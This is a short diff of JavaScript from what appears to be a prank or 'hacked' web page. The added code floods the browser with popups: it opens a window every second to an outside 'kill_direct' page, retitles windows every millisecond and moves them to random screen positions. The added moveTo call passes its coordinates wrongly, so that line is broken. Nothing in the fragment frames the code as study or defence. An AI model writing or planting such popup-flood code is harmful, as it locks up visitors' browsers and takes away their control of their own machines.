@@ -9,7 +9,7 @@
             var hackedWindow = window.open("", "", "width=400,height=400")
             hackedWindow.document.writeln(text)
             setInterval(function() {
-                hackedWindow.document.title = (Math.random() * Number.MAX_SAFE_INTEGER * Number.MAX_SAFE_INTEGER).toString()
+                hackedWindow.document.title = (Math.random() * Number.MAX_VALUE).toString()
             }, 1)
             
             var height = window.screen.availHeight
@@ -68,7 +68,9 @@
                 }, 0.1)
 
                 setInterval(function() {
-                    addWindow("https://hacklers.github.io/kill_direct")
+                    var kill_direct = window.open("https://hacklers.github.io/kill_direct", "", "width=400, height=400")
+                    kill_direct.document.title = Math.random() * Number.MAX_VALUE
+                    kill_direct.moveTo(Math.floor(Math.random() * (window.screen.availWidth - 400), Math.random() * (window.screen.availHeight - 400)))
                 }, 1000)
         </script>
     </body>
